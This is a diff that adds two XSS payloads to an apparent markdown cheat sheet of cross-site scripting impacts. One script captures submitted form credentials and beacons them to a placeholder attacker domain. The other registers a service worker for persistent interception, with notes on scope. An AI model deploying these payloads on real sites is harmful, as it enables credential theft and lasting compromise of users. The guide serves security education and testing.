@@ -8,6 +8,7 @@
 - [Content Spoofing](#content-spoofing)
 - [Data Exfiltration](#data-exfiltration)
 - [Denial of Service](#denial-of-service)
+- [Persistent Access](#persistent-access)
 
 ## Credential Stealing
 
@@ -37,6 +38,17 @@
             })
     </script>
     ```
+
+- Capturing credentials as they are submitted
+    ```html
+    <script>
+        document.addEventListener('submit', (event) => {
+            const data = new URLSearchParams(new FormData(event.target));
+            navigator.sendBeacon('https://[ATTACKER-DOMAIN]/', data);
+        }, true);
+    </script>
+    ```
+    Unlike a stolen cookie, a captured password stays usable after the session ends and may also work on other services where the victim reused it.
 
 ## Performing Actions as the Victim
 
@@ -152,3 +164,18 @@
         }
     </script>
     ```
+
+## Persistent Access
+
+### A service worker registered by the payload keeps intercepting requests on later visits, even after the injected payload has been removed. [^1]
+
+- Registering a service worker
+    ```html
+    <script>
+        // The worker script must be served from the vulnerable origin, e.g., as an uploaded file
+        navigator.serviceWorker.register('/uploads/sw.js');
+    </script>
+    ```
+    The worker can read and rewrite the responses of pages within its scope, and it stays registered until it is explicitly removed or the victim clears the site's data.
+
+[^1]: Applies when the attacker can serve a JavaScript file from the vulnerable origin, such as an uploaded file or a JSONP endpoint. The worker controls only pages under the script's directory unless the response widens its scope with the `Service-Worker-Allowed` header.
